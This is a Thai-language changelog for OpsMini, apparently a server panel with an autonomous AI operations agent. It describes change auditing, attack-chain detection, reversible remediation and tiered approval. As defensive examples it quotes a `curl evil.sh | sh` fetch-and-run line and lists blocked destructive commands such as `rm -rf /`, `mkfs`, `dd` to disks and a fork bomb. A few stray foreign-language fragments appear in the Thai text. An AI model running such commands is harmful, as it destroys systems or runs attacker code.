# บันทึกการอัปเดต

บันทึกการเปลี่ยนแปลงของแต่ละเวอร์ชัน

## v1.4.1 (2026-11-06)

เวอร์ชันแพตช์ แก้ปัญหาสามจุดที่เจอได้ในงานประจำวัน และเพิ่มตัวช่วยระบุโฮสต์ในสภาพแวดล้อมที่มีหลายเครื่อง

**Instance ID ของแผงควบคุม (ใหม่)**

แผงควบคุมแต่ละเครื่องจะสร้าง `opsmini-xxxxxxxxxxxx` ตั้งแต่เริ่มทำงานครั้งแรกและบันทึกไว้ (ฐานข้อมูลเป็นหลัก และเก็บสำเนาไว้ในไดเรกทอรีข้อมูลให้สคริปต์อ่านได้โดยตรง) แล้วรายงานพร้อมการลงทะเบียนกับ OpsAnt ใช้แยกแยะว่าเป็นเครื่องไหนเมื่อชื่อโฮสต์ซ้ำกัน หรือเมื่อ NAT ทำให้หลายเครื่องออกอินเทอร์เน็ตด้วย IP เดียวกัน แสดงอยู่ใต้ชื่อเรื่องบนแดชบอร์ด คลิกเพื่อคัดลอก

**ทดสอบการเชื่อมต่อ OpsAnt (ใหม่)**

เดิมกรอกที่อยู่และโทเค็นแล้วบันทึกได้เท่านั้น จะถูกหรือไม่ต้องไปดูล็อก ตอนนี้ปุ่ม "ทดสอบการเชื่อมต่อ" จะทำขั้นตอนลงทะเบียนจริง (เชื่อมต่อ TCP → เปิดสตรีม gRPC → ลงทะเบียน → รอผลตอบ) และแยกสาเหตุความล้มเหลวเป็นสามประเภท: รูปแบบที่อยู่ผิด / เครือข่ายไม่ถึง / โทเค็นถูกปฏิเสธ การทดสอบใช้ตัวตนชั่วคราว จึงไม่ตัดการเชื่อมต่อที่ทำงานอยู่ และไม่บันทึกการตั้งค่าใด ๆ

**ตัวแปรสภาพแวดล้อมของเทอร์มินัล (แก้ไข)**

แผงควบคุมทำงานเป็นบริการระบบของ systemd และ systemd ไม่ได้กำหนด `HOME` ให้บริการประเภทนี้ ทำให้ในเทอร์มินัลคำสั่ง `cd` ล้มเหลวด้วย `HOME not set` เครื่องหมาย `~` ไม่ถูกขยาย และ vim / git ข้าม `~/.vimrc` กับ `~/.gitconfig` ไปโดยไม่แจ้ง ตอนนี้ดึง `HOME`, `USER`, `LOGNAME`, `SHELL`, `PWD` จาก `/etc/passwd` ตามผู้ใช้ปัจจุบันแล้ว

**อื่น ๆ**

- `install.sh -n` (แสดงผลเท่านั้น ไม่ติดตั้ง) ไม่แสดงรหัสผ่านเริ่มต้นที่จะใช้ไม่ได้อีกหลังติดตั้ง

## v1.4.0 (2026-11-02)

**จาก "จัดการได้" สู่ "จัดการอย่างมีหลักฐาน"**

v1.3 ทำให้ Agent เรียนรู้ที่จะค้นหาปัญหาด้วยตัวเองและลงมือตามขอบเขตที่กำหนด v1.4 เติมเต็มอีกด้านหนึ่ง: **ก่อนลงมือต้องเข้าใจก่อนว่าเกิดอะไรขึ้น** และหลังลงมือต้องบอกได้ว่าทำอะไรไปบ้าง ย้อนกลับได้หรือไม่

สรุปสั้น ๆ สำหรับเวอร์ชันนี้: **ทุกการแก้ไขบนโฮสต์ถูกบันทึก ถูกประเมิน ถูกเชื่อมโยง ทุกการกระทำถูกบันทึกบัญชีและย้อนกลับได้**

**การรับรู้การเปลี่ยนแปลง (ใหม่)**

ประโยคที่พบบ่อยที่สุดในการสอบสวนของการปฏิบัติการคือ "ผมไม่รู้ว่าตั้งแต่ตอนที่มันยังปกติดีจนถึงตอนนี้เกิดอะไรขึ้น" เวอร์ชันนี้ปิดช่องว่างนั้น

- แหล่งที่มาของการเปลี่ยนแปลงหกประเภทถูกเก็บตลอดเวลา: ไฟล์กำหนดค่า (diff ทีละบรรทัด), แพ็กเกจซอฟต์แวร์, สถานะบริการ, สิทธิ์บัญชี, กฎไฟร์วอลล์, งานตามกำหนด
- การระบุที่มาแบ่งสามระดับและแสดงตามจริง: `已确认` (ชี้ไปยังบุคคล конкреได้) / `推断` (น่าจะเป็นใคร) / `未知` ไม่ใช้คำว่า "ระบบ" กลบเกลื่อน
- แต่ละบันทึกมีแฮชของบันทึกก่อนหน้า สร้างเป็น**เชนป้องกันการปลอมแปลง** ตรวจสอบได้ทุกเมื่อ หากถูกลบหรือแก้ไขจะขาดที่จุดนั้น
- diff ถูก**ปิดข้อมูลอ่อนไหว**ก่อนบันทึกลงฐานข้อมูล (`password=`, `api_key=`, บล็อกคีย์ส่วนตัว)
- **การทบทวนกฎ**ให้คะแนนด้วย 0 token ก่อน (0–1 พร้อมเหตุผลสามถึงห้าข้อ): เส้นทางความเสี่ยงสูง, ผู้ดำเนินการยืนยันได้หรือไม่, แหล่งที่มาเป็นอินเทอร์เน็ตสาธารณะหรือไม่, อยู่นอกเวลาทำงานหรือไม่, มีเหตุการณ์ความเสี่ยงสูงในช่วงเดียวกันหรือไม่, เกิดจากตัวจัดการแพ็กเกจหรือไม่… หากตัดสินว่าน่าสงสัย (≥0.55) จึงยกระดับเป็นเหตุการณ์และปลุก Agent
- Agent ได้รับ **diff ดิบ** ไปวิเคราะห์เชิงลึก แสดงผลเป็น "การตัดสิน / หลักฐาน / ข้อเสนอแนะ" แต่**ไม่มีสิทธิ์เขียนใด ๆ**
- สัญญาณรบกวนที่รู้จักสามารถเพิ่ม**กฎเพิกเฉย**ได้ (รองรับไวลด์การ์ด `**`) เมื่อตรงกันจะไม่เกิดเหตุการณ์ด้วยซ้ำ
- การเปลี่ยนแปลงประเภทกำหนดค่าและบัญชีเก็บสแนปช็อตไฟล์ต้นฉบับไว้ ย้อนกลับได้โดยตรงจากหน้ารายละเอียด หากล้มเหลวสามารถย้อนกลับกลับมาได้อีก

**เชนการโจมตีและธุรกรรมการจัดการ (ปิดวงจรอัตโนมัติ)**

- **เชนการโจมตี**: เชื่อม "WebShell ลงเครื่อง → โปรเซสต้องสงสัย → การเชื่อมต่อควบคุมภายนอก" เป็นการบุกรุกครั้งเดียว ห้าขั้นตอน ให้คะแนนจากตัวชี้วัดร่วม + ความใกล้เคียงของเวลา (≥0.45 รวมเข้าเชน) ตั้งใจเข้มงวด: การ bruteforce เดี่ยวไม่เปิดเชน, ตัวชี้วัดและบันทึกที่พุ่งสูงจะไม่เข้าเชนเด็ดขาด, **การเปลี่ยนแปลงจะถูกรวมเป็นขั้นตอน "การฝังตัวคงอยู่" ก็ต่อเมื่อสามเงื่อนไขเป็นจริงพร้อมกัน**: ถูกตัดสินว่าน่าสงสัย + แก้ไขตำแหน่งที่ทนต่อการรีสตาร์ท + เชนมี "ลงเครื่อง" หรือ "เชื่อมต่อภายนอก" ปรากฏแล้ว
- **ธุรกรรมการจัดการ**: การกระทำที่ย้อนกลับได้ (แยกกัก/แช่แข็ง/บล็อก/ตัดทอน/สแนปช็อต) จะ**ย้อนกลับอัตโนมัติตามลำดับย้อนกลับ**เมื่อการจัดการล้มเหลว การกระทำที่ย้อนกลับไม่ได้ระบุชัดว่า "N รายการไม่สามารถยกเลิกได้" ไม่แสร้งว่าย้อนกลับได้ บนแผงสามารถย้อนกลับทีละรายการได้ด้วยมือ
- **การทบทวนแบบเงา**: การจัดการที่รันในโหมดเงา ภายหลังตัดสินตามข้อเท็จจริงเป็น `would_help` / `unnecessary` / `unknown` — `unnecessary` ต่อเนื่องหมายความว่าควรลด阈值, `would_help` ต่อเนื่องหมายความว่าสามารถยกระดับเป็น assist ได้
- **การยับยั้งจากผลตอบรับ**: กลุ่มเหตุการณ์เดียวกันถูกเพิกเฉย 2 ครั้งภายใน 7 วัน ครั้งต่อไปจะไม่ปลุก Agent (ยังคงบันทึกไว้)
- **การตรวจสอบล้มเหลวจะลองใหม่หนึ่งครั้งอัตโนมัติ** และป้อนการกระทำที่ถูกบล็อกครั้งก่อนกับผลการตรวจสอบกลับให้โมเดล เพื่อหลีกเลี่ยงการย้ำสมมติฐานเดิม
- หน้าการเปลี่ยนแปลงและเชนการโจมตี**กระโดดไปหากันได้สองทาง** แต่ละขั้นตอนของเชนการโจมตีจะระบุแหล่งที่มา (WebShell / โปรเซสต้องสงสัย / การเชื่อมต่อเครือข่ายภายนอก / การเปลี่ยนแปลง)

**การลดสัญญาณรบกวนของเหตุการณ์**

การแจ้งเตือนจากตัวชี้วัดและบันทึกที่พุ่งสูงเปลี่ยนเป็น "พับเก็บไปเรื่อย ๆ ตราบที่เหตุการณ์ยังไม่ถูกจัดการ" — กฎ CPU ข้อเดียวไม่พ่นเหตุการณ์รอจัดการแปดรายการในคืนเดียวอีกต่อไป หน้าต่างความผิดปกติในการเข้าสู่ระบบขยายจาก 1 ชั่วโมงเป็นครึ่งวัน เหตุการณ์ที่ถูกจัดการแล้วเกิดขึ้นซ้ำจะสร้างใหม่ตามปกติ ไม่กลืนการเกิดซ้ำ

**ไปป์ไลน์บันทึก (ใหม่, ปิดโดยค่าเริ่มต้น)**

มีเอนด์พอยต์เก็บข้อมูลที่**เข้ากันได้กับกำหนดค่า Filebeat**ในตัว ตำแหน่งเทียบเท่า filebeat บนโฮสต์ที่ถูกจัดการ แต่ไม่ต้องติดตั้งโปรเซสแยก

- ไดเรกทอรีงาน `tasks.d` (หนึ่งงานหนึ่ง YAML) กำหนดค่าหลัก `main.yml` กำหนดทางออก; กำหนดค่า filebeat ที่มีอยู่แยกออกมาก็ใช้ได้
- **31 Filebeat processor**: เพิ่มลบแก้ไขฟิลด์, แยกวิเคราะห์ JSON/CSV/XML/syslog, dissect, script, fingerprint, โดเมนและทิศทางเครือข่าย
- สามทางออก: Elasticsearch, Kafka, Logstash (Lumberjack v2 + TLS)
- `at-least-once`: เลื่อน offset หลังจากส่งสำเร็จเท่านั้น ล้มเหลวเข้าคิวบนดิสก์ หลัง crash ส่งซ้ำจากตำแหน่งที่ยืนยันแล้ว
- **ไม่เก็บบันทึกใด ๆ โดยค่าเริ่มต้น**: จะเริ่มก็ต่อเมื่อมีไฟล์งาน, เปิดใช้งานอย่างชัดเจน, หรือได้รับงานที่ส่งลงมาจากแพลตฟอร์ม
- แผง "บันทึก → ไปป์ไลน์" ดูสถานะการทำงาน, อัตราการอ่านต่องาน, ปริมาณค้างสะสม และ**ดูตัวอย่างเหตุการณ์ล่าสุด 20 รายการแบบเรียลไทม์** — ปรับ processor ไม่ต้องไปค้นใน ES ก่อน

**ระบบปลั๊กอิน (ใหม่)**

เคอร์เนลทำเฉพาะสิ่งที่ทุกโฮสต์ต้องการ ความสามารถทางธุรกิจมอบให้ปลั๊กอิน

- ปลั๊กอินเป็น**โปรเซสแยก** รายงานตัวชี้วัด เหตุการณ์ และ heartbeat ผ่าน Unix socket ด้วย JSON แบบบรรทัดคั่น; crash ไม่กระทบแผง
- แพ็กเกจต้องมี sha256 และลายเซ็น ed25519 ตอนติดตั้งตรวจสอบลายเซ็น, `apiVersion`, แพลตฟอร์ม, ข้อกำหนดเวอร์ชันตามลำดับ
- วงจรชีวิต: ติดตั้ง → เปิดใช้งาน → ทำงาน → ปิดใช้งาน → อัปเกรด (เวอร์ชันเก่าเก็บไว้ย้อนกลับได้) → ลบ
- **ชี้แจงตามจริง**: ปลั๊กอินเวอร์ชันนี้รันด้วยผู้ใช้เดียวกับแผง **ไม่มี**ผู้ใช้ระบบแยกและข้อจำกัด cgroup, `capabilities` เป็นการประกาศไม่ใช่การบังคับ ความหมายของลายเซ็นคือ "แหล่งที่มาเชื่อถือได้" ไม่ใช่ "พฤติกรรมปลอดภัย"
- ต้องกำหนดค่าคีย์สาธารณะในการตั้งค่าหรือเปิดโหมด unsigned ก่อนจึงจะติดตั้งได้ (หลังแก้ต้องรีสตาร์ทแผง); แพ็กเกจปลั๊กอินทางการยังไม่เผยแพร่ หน้าปลั๊กอินว่างเปล่าเป็นสถานะที่คาดไว้

**การสำรองข้อมูลและการกู้คืน (ใหม่)**

- วัตถุสำรองข้อมูลสามประเภท: ไดเรกทอรี/ไฟล์, `mysql:库名`, `redis:路径`, `tar.gz` + `manifest.json` (พร้อม sha256 ต่อชิ้น)
- การสำรองข้อมูลเป็นคลิกเดียวจริง; **การกู้คืนไม่ใช่**: ตรวจสอบล่วงหน้า → สแนปช็อตอัตโนมัติก่อนกู้คืน → ดำเนินการ → ตรวจสอบสุขภาพล้มเหลวย้อนกลับอัตโนมัติ และต้องพิมพ์ชื่อสแนปช็อตเพื่อยืนยัน
- จำนวนชุดที่เก็บรักษาล้างตามไดเรกทอรีทั้งหมด ไม่ลบชิ้นส่วนเดี่ยวเด็ดขาด
- การสำรองข้อมูลเป็น**ประเภทที่สี่ของงานตามกำหนด** ใช้เอนจินเดียวกับการสำรองด้วยมือ; ล้มเหลวเขียนกลับสถานะงานและกระตุ้นการแจ้งเตือน "จำนวนการสำรองล้มเหลว"
- ที่เก็บข้อมูลระยะไกล (S3-compatible / SFTP) โค้ดพร้อมแล้ว แต่**เวอร์ชันนี้ไม่ถือเป็นเนื้อหาที่ส่งมอบ** ต้องกำหนดค่าด้วยมือใน `config.yaml` จึงจะมีผล และยังไม่ได้ทดสอบร่วมกับเครื่องจริง

**อื่น ๆ**

- กฎการแจ้งเตือน 12 → 24 ข้อ, การตรวจสอบพื้นฐาน 13 → 45 รายการ
- การเชื่อมต่อ AI โมเดลใหญ่รองรับสี่โปรโตคอล: OpenAI / Anthropic / Azure / Gemini; รายการโมเดลดึงและเลือกได้ ไม่ต้องพิมพ์ชื่อโมเดลเองอีก
- **การป้องกันการฉีด**ในพรอมต์ของ Agent: เนื้อหาที่ไม่น่าเชื่อถือ (เนื้อหา diff, ชื่อผู้ใช้, เส้นทาง) ไม่สามารถปลอมแปลงขอบเขตย่อหน้าหรือปิด code fence ก่อนกำหนด; เนื้อหาตัวเองไม่เปลี่ยน — `curl evil.sh | sh` ต้องส่งถึงโมเดลตามเดิม มันคือข้อสรุป
- สมาชิกที่รวมในศูนย์เหตุการณ์ขยายดูทั้งหมดได้ (เดิมแสดงเพียงไม่กี่รายการแรก)
- แก้ไข: `/files/du` เส้นทางว่างใช้เวลา 15 วินาที, จุดยึดเชนการเปลี่ยนแปลงรายงานผิดบนฐานข้อมูลที่มีอยู่เดิม, ตารางการเปลี่ยนแปลงบนมือถือถูกบีบเป็นตัวอักษรบรรทัดละตัว
- ไดเรกทอรีข้อมูลรวมเป็น `/data/opsmini` ถอนการติดตั้งลบไดเรกทอรีทันที

**คำแนะนำการอัปเกรด**

อัปเกรดจาก v1.3.x เพียงแทนที่ไบนารีและรีสตาร์ท ฐานข้อมูลจะย้ายข้อมูลอัตโนมัติ นโยบายเริ่มต้นที่เพิ่มใหม่เช่น `change-review` จะถูกเพาะแบบ idempotent ตามชื่อ ฐานข้อมูลเก่าก็ได้รับเช่นกัน ไปป์ไลน์บันทึกและปลั๊กอินไม่เปิดใช้งานโดยค่าเริ่มต้น จะไม่เริ่มเก็บหรือโหลดสิ่งใดเพราะการอัปเกรด

## v1.3.0 (2026-10-28)

**Agent อัตโนมัติ: จาก "คุณถามมันตอบ" สู่ "มันเฝ้าดูเอง"**

เวอร์ชันนี้ผลักดัน OpsMini จาก "ผู้ช่วย AI ที่ทำงานตามคำสั่ง" ไปสู่ Agent ประจำการที่ "ค้นหาปัญหาเอง ตัดสินใจเอง และลงมือตามขอบเขตที่คุณกำหนด" แกนหลักคือวงจรปิดตั้งแต่การเก็บข้อมูลจนถึงการตรวจสอบยืนยัน ไม่ใช่แค่เพิ่มปุ่มอีกสองสามปุ่ม

**ชั้นการรับรู้ (internal/sentinel)**

- ตัวเก็บข้อมูลหกประเภทประจำการ: บันทึกพุ่งสูง (EWMA baseline ตามถังรายชั่วโมง + ขีดจำกัดแข็ง 20MB/min), การเข้าสู่ระบบผิดปกติ (นอกเวลาทำงาน / IP ที่ปรากฏครั้งแรก / สำเร็จหลังถูก bruteforce / `authorized_keys` เพิ่งถูกแก้ไข), สคริปต์ลงจอดในไดเรกทอรีเว็บ (ลักษณะ WebShell 14 ประเภท ลักษณะเด่นชัดจัดเป็น high โดยตรง), การแตกกระบวนการ (ผู้ใช้เว็บเปิด shell / curl / python), การเชื่อมต่อออกภายนอกที่น่าสงสัย, การแจ้งเตือนตัวชี้วัด
- ผลการเก็บข้อมูลถูกปรับให้เป็นมาตรฐานเดียวกันเป็น **Signal**: ลายนิ้วมือตัดซ้ำ, บันทึกลง SQLite แบบถาวร; ส่งผ่าน channel ภายในโปรเซส ไม่นำ message queue มาใช้
- ความถี่ในการเก็บข้อมูลแบ่งระดับ 2s–20s, บันทึกที่ผิดปกติจะสืบย้อนกลับไปยังโปรเซสที่ถือไฟล์นั้นอยู่ เพื่อหลีกเลี่ยง "บันทึกกำลังเพิ่มแต่ไม่รู้ใครเขียน"

**ศูนย์เหตุการณ์**

- Signal ถูกรวมเป็น**เหตุการณ์**ตามลายนิ้วมือและหน้าต่างเวลา เหตุการณ์หนึ่งมีชื่อเรื่อง หมวดหมู่ ระดับ วัตถุ จำนวนครั้งที่เกิด
- ตัวกรองหกตัว (รอดำเนินการ / รอปลุก / ทั้งหมด / ดำเนินการแล้ว / ล้มเหลว / ละเว้นแล้ว) มีตัวนับกำกับ เมื่อเลือกจะแสดงคำอธิบายเกณฑ์ของสถานะนั้น
- รายละเอียดเหตุการณ์สามารถเจาะลึกไปยัง Signal ที่เกี่ยวข้อง, บันทึกการทำงานของ Agent, ห่วงโซ่การกระทำทีละรายการ (เครื่องมือ, พารามิเตอร์, คำตัดสิน, เอาต์พุตดิบ)

**กลไกนโยบาย (internal/trigger)**

- นโยบายในตัวห้ารายการพร้อมใช้ทันที: `webshell-respond`, `auth-anomaly`, `proc-anomaly` (เฉพาะ critical), `log-growth` (โหมดเงา), `net-anomaly` (ปิดโดยค่าเริ่มต้น)
- ต้องตรงเงื่อนไขสามข้อพร้อมกันจึงจะปลุก Agent: หมวดหมู่ตรงกัน, ระดับถึงเกณฑ์, ไม่อยู่ในช่วงคูลดาวน์; หากไม่ตรงเพียงบันทึกเหตุการณ์ **ไม่สิ้นเปลืองโควตาโมเดล**
- แต่ละนโยบายกำหนดงบประมาณแยกได้: จำนวนการเขียน, จำนวนก้าวของโมเดล, ระยะเวลาตามนาฬิกาจริง, ขีดจำกัด token, เกินขีดใดขีดหนึ่งหยุดทันที
- นโยบายเป็นข้อมูลไม่ใช่โค้ด: เพิ่มลบแก้ไข ปรับเกณฑ์ เปลี่ยนโหมดในหน้าจอ ไม่ต้องรีสตาร์ท

**สามโหมดการทำงาน**

- `shadow` สังเกตเท่านั้น: เก็บหลักฐานตามปกติ เขียนข้อสรุปและ "ตั้งใจจะทำอย่างไร" ไม่ดำเนินการเขียนใดๆ เหมาะสำหรับรันสองสามวันแรกเพื่อปรับเทียบการตัดสินใจ
- `assist` ช่วยเหลือ: การกระทำแบบอ่านเท่านั้นดำเนินการอัตโนมัติ การเขียนใดๆ หยุดรอให้คนยืนยัน — ระดับที่แนะนำสำหรับใช้ประจำ
- `auto` อัตโนมัติ: เฉพาะการกระทำความเสี่ยงต่ำใน whitelist `auto_tools` เท่านั้นที่ยกเว้นการยืนยัน ระดับ L2 ขึ้นไปต้องให้คนพยักหน้าเสมอ

**การกระทำที่ย้อนกลับไม่ได้ทำให้ย้อนกลับได้**

- ลบ → **กักกัน**: ย้ายไฟล์ไปยังพื้นที่กักกัน บันทึกเส้นทางเดิม, checksum, สิทธิ์, คืนค่าได้ในคลิกเดียว
- `kill -9` → **แช่แข็งด้วย SIGSTOP**: หยุดก่อนเก็บรักษาสภาพที่เกิดเหตุ ยืนยันแล้วจึงตัดสินใจ
- แบนถาวร → **แบนชั่วคราวที่มี TTL**: ครบกำหนดปลดแบนอัตโนมัติ การแบนผิดจะไม่กลายเป็นอุบัติเหตุ
- **สแนปช็อต**ก่อนลงมือ: เก็บสำรองก่อนแก้การตั้งค่า หากตรวจสอบไม่ผ่านสามารถย้อนกลับได้

**ห้าด่านความปลอดภัย (internal/safety)**

- นโยบายพารามิเตอร์, งบประมาณการเขียน, เส้นทางที่ป้องกัน, สวิตช์หยุดฉุกเฉิน (killswitch), การตรวจสอบยืนยันหลังดำเนินการ (`no_new_signal`, `port_listen`, `file_absent` เป็นต้น)
- เหตุการณ์ที่ตรวจสอบไม่ผ่านจะถูกทำเครื่องหมายว่าล้มเหลวและส่งคืนให้คน ไม่ใช่ปล่อยผ่านเหมือนสำเร็จ; รายงานว่างก็ถือว่าล้มเหลวเช่นกัน
- การเรียกเครื่องมือทุกครั้งเข้าสู่การตรวจสอบการกระทำ: ใครเป็นผู้กระตุ้น, เรียกอะไร, ส่งพารามิเตอร์อะไร, ได้ผลลัพธ์อะไรกลับมา

**การเก็บรักษาข้อมูล**

- หน้าตั้งค่าแผงเพิ่มหน้า "การเก็บรักษาข้อมูล": เหตุการณ์และ Signal เก็บเริ่มต้น 30 วัน, การตรวจสอบการกระทำ 180 วัน, รายการกักกันและบันทึกการแบน 30 วัน
- เหตุการณ์ที่รอดำเนินการพร้อม Signal และห่วงโซ่การกระทำ **ไม่ถูกลบอัตโนมัติเด็ดขาด**; ไฟล์ที่กักกันไม่ถูกแตะต้องจนกว่าจะคืนค่า, การแบนไม่ถูกแตะต้องจนกว่าจะปลดแบน
- เพิ่ม "ล้างประวัติเหตุการณ์": ล้างทั้งหมดโดยไม่สนหน้าต่างการเก็บรักษาในครั้งเดียว (รวมสำเนาไฟล์กักกันและบันทึกการแบน, ยกเลิกกฎไฟร์วอลล์, รีเซ็ตคูลดาวน์นโยบาย) ดำเนินการหลังยืนยันสองครั้ง

**การซ้อมและตรวจสอบ**

- เพิ่ม `scripts/chaos-drill.sh`: ฉีดความล้มเหลวสี่ประเภท (บันทึกพุ่งสูง / WebShell ลงจอด / SSH bruteforce สำเร็จ / ผู้ใช้เว็บแตก shell) แล้วใช้ API ตรวจสอบว่าชั้นการรับรู้สร้างเหตุการณ์ที่สอดคล้องหรือไม่
- บนเครื่องทดสอบอินเทอร์เน็ตสาธารณะทั้งสี่สถานการณ์ผ่านทั้งหมด; ในโหมด `auto` กักกัน WebShell จริงและตรวจสอบผ่าน

**การปรับปรุงอื่นๆ**

- ข้อความหน้าเข้าสู่ระบบเปลี่ยนเป็นตำแหน่งของ Agent (7 ภาษา), ชื่อแท็บเปลี่ยนตามสถานะการเข้าสู่ระบบ
- การ์ดแจ้งเตือนรองรับการคลิกพื้นที่ว่างของหน้าเพื่อปิด
- ตราประทับเวอร์ชันบิลด์เปลี่ยนไปใช้ `git describe --tags --dirty`, เพิ่มการตรวจสอบล่วงหน้าก่อนเผยแพร่ `make release-check` เพื่อหลีกเลี่ยงการเผยแพร่ด้วย working tree ที่สกปรก

**คำอธิบายการอัปเกรด**

- v1.2.1 → v1.3.0 แค่แทนที่ไบนารีแล้วรีสตาร์ท ตารางใหม่สร้างอัตโนมัติ ไม่ต้อง migration
- หลังอัปเกรดแนะนำให้ดูก่อนที่ "ศูนย์เหตุการณ์ → นโยบาย" ดูนโยบายในตัวห้ารายการ: ค่าเริ่มต้นเป็น `assist` หรือ `shadow` ทั้งหมด จะไม่แก้ระบบอัตโนมัติ

## v1.2.1 (2026-10-27)

**แก้ไข: ถอดเครื่องมือ AI หลายโฮสต์ 4 ตัวที่ล้ำเส้นสถาปัตยกรรม**

v1.2.0 ลงทะเบียนเครื่องมือหลายโฮสต์ 4 ตัว (`list_remote_hosts` / `remote_exec` / `remote_pull_file` / `remote_push_file`) เพื่อให้ AI ของแผงควบคุมส่งคำสั่งและไฟล์ไปยังโฮสต์ที่จัดการอื่นผ่าน HTTP API ของ control plane บน OpsMini Server (4508) การออกแบบนี้ล้ำเส้นสถาปัตยกรรม จึงถูกถอดออกแล้ว

- 4508 เป็น API **ภายใน** ที่ OpsMini Server ให้ OpsAnt ใช้ กำหนดขอบเขตว่า "เฉพาะเครื่องนี้ / เครือข่ายภายใน" และไม่ตรวจสอบสิทธิ์
- บทบาทของแผงควบคุมบนเส้นทางหลายโฮสต์คือ **Agent ที่ถูกจัดการ** ควรสื่อสารกับ Server ผ่าน gRPC เชื่อมต่อยาวที่ 4507 เท่านั้น ไม่ควรเรียก control plane ย้อนกลับ
- การจะทำให้ดีไซน์นี้ใช้งานได้ ต้องเปิด 4508 สู่อินเทอร์เน็ต ซึ่งเท่ากับวางประตูรันคำสั่งระยะไกลที่ไม่มีการยืนยันตัวตน

จำนวนเครื่องมือจึงกลับมาเป็น **29** (อ่านอย่างเดียว 16 / เขียนความเสี่ยงต่ำ 5 / เขียนความเสี่ยงสูง 8) ส่วนการจัดการหลายโฮสต์และ AI หลายโฮสต์เป็นหน้าที่ของ OpsAnt ซึ่งมี API การรันแบบรวม (`/api/opsant/v1/tasks/run-shell/`, `tasks/run-script/`, `tasks/send-file/`, `tasks/get-minion-file/` ฯลฯ) และเอนจินสามตัว

**ไม่ต้องย้ายข้อมูล**: เครื่องมือทั้ง 4 ตัวในเวอร์ชันก่อนต้องอาศัยการเข้าถึง 4508 ซึ่งใช้งานจริงไม่ได้อยู่แล้ว

## v1.2.0 (2026-10-27)

**AI เอเจนต์: จาก "ที่ปรึกษาการดูแลระบบ" สู่ "ผู้ปฏิบัติงาน"**

- **แกน ReAct แบบเบาเขียนเอง**: ลูป Reason → Act → Observe โดยไม่ใช้เฟรมเวิร์ก Agent ใด ๆ คงรูปแบบไบนารีเดียวและไม่ต้องใช้ CGO หนึ่งรอบจำกัด 12 ขั้นตอน หากเกินจะหยุดเรียกเครื่องมือและรายงานข้อมูลที่ทราบแล้ว
- **เครื่องมือในตัว 33 ตัว**: อ่านอย่างเดียว 16 ตัว (ภาพรวมระบบ / โปรเซส / พอร์ต / ดิสก์ / การใช้พื้นที่ไดเรกทอรี / ค้นหาล็อก / บริการ / คอนเทนเนอร์ / ความปลอดภัย ฯลฯ) เขียนความเสี่ยงต่ำ 5 ตัว เขียนความเสี่ยงสูง 8 ตัว และเครื่องมือหลายโฮสต์อีก 4 ตัวที่ลงทะเบียนตามการตั้งค่า Agent
- **การเรียกเครื่องมือแบบสตรีมมิ่ง**: นำชิ้นส่วน `tool_calls` มาต่อกันตาม index ผู้ให้บริการที่ไม่รองรับการสตรีมจะสลับไปลองแบบไม่สตรีมโดยอัตโนมัติ
- **แสดงลำดับความคิด**: หน้าจอแสดงทีละขั้นว่าเรียกเครื่องมือใด ส่งพารามิเตอร์อะไร ได้ผลลัพธ์ดิบอะไร ทำให้ตรวจสอบข้อสรุปได้

**การอนุญาตแบบแบ่งระดับและการมีส่วนร่วมของมนุษย์**

- **แบบจำลองความเสี่ยง 4 ระดับ**: L0 อ่านอย่างเดียวทำได้เอง / L1 ความเสี่ยงต่ำต้องยืนยันโดยค่าเริ่มต้น (เปิดข้อยกเว้นรายเครื่องมือได้) / L2 ความเสี่ยงสูงต้องยืนยันทุกครั้งและยกเว้นไม่ได้ / L3 การทำงานที่ก่อความเสียหายร้ายแรงถูกบล็อกด้วยรูปแบบตายตัว
- **L3 ถูกบล็อกก่อนลงมือ**: `rm -rf /`, `mkfs`, `dd of=/dev/sd*`, fork bomb, ล้างไฟร์วอลล์ทั้งหมด, เขียนทับ `/etc/passwd` และอื่น ๆ จะไม่ถูกเรียกใช้แม้ผู้ดูแลจะอนุมัติ พร้อมกฎปกป้องแผงควบคุมอีกสองข้อ (ห้ามแตะไดเรกทอรีข้อมูล ห้ามปิดพอร์ตที่แผงฟังอยู่)
- **หยุดชั่วคราวและทำต่อ**: การเรียกที่เสี่ยงสูงจะถูกบันทึกและพักไว้ เมื่อผู้ใช้กดอนุมัติหรือปฏิเสธในแชต ระบบจะกู้ลำดับข้อความจาก SQLite แล้วทำต่อ เส้นทางปฏิเสธได้รับการยืนยันแล้วว่าไม่มีผลข้างเคียง

**MCP สองทิศทาง**

- **MCP ไคลเอนต์**: ใช้ MCP Go SDK อย่างเป็นทางการ รองรับทั้ง stdio และ Streamable HTTP เครื่องมือของเซิร์ฟเวอร์ MCP ภายนอกจะถูกเชื่อมเป็น `mcp__<เซิร์ฟเวอร์>__<เครื่องมือ>` และเทียบเคียงการตั้งค่าทุก 2 นาที
- **MCP เซิร์ฟเวอร์**: เผยแพร่ชุดเครื่องมือของตนเองที่ `/mcp` พร้อมการยืนยันด้วย Bearer token โดยค่าเริ่มต้นเผยแพร่เฉพาะ L0/L1 (ไม่ส่ง L2 ให้ไคลเอนต์ที่ไม่ได้รับอนุญาต เพราะไคลเอนต์ภายนอกแสดงกล่องยืนยันของแผงควบคุมไม่ได้)

**งาน AI ตามกำหนดเวลา**

- **ประเภทงานตามกำหนดเวลาชนิดที่สี่ "งานเอเจนต์"**: เขียนพรอมป์ต์แล้วให้ทำงานตาม cron การจัดตาราง เปิด/ปิด เวลาทำงานล่าสุด และการแจ้งเตือนเมื่อล้มเหลว ใช้กลไกเดิมทั้งหมด
- **ลดระดับการอนุญาตเมื่อไม่มีผู้ดูแล**: เมื่อทำงานตามเวลาไม่มีคนกด "อนุมัติ" เครื่องมือที่อยู่ใน L2 จะถูกปฏิเสธทันทีและส่งเหตุผลกลับให้โมเดล โมเดลจะเปลี่ยนไปใช้เครื่องมืออ่านอย่างเดียวทำงานต่อ และระบุในรายงานว่า "การดำเนินการนี้ต้องทำโดยมนุษย์" พร้อมคำสั่งที่คัดลอกไปใช้ได้
- **ความน่าเชื่อถือและการคุมต้นทุน**: จำกัดจำนวนขั้นและเวลารวมต่องาน หากล้มเหลวติดกัน 3 ครั้งจะปิดใช้งานงานอัตโนมัติ เพื่อไม่ให้ "ล้มเหลวทุกวันและแจ้งเตือนทุกวัน" การบันทึกในแผงควบคุมจะรีเซ็ตจำนวนครั้งที่ล้มเหลว
- **พรีเซ็ตการตรวจสอบในตัว 5 ชุด**: ตรวจสอบโฮสต์ / ตรวจสอบความปลอดภัย / พื้นที่ดิสก์ / สถานะบริการ / ความผิดปกติของล็อก พร้อมพรีเซ็ตความถี่ที่ใช้บ่อยอีก 4 แบบ

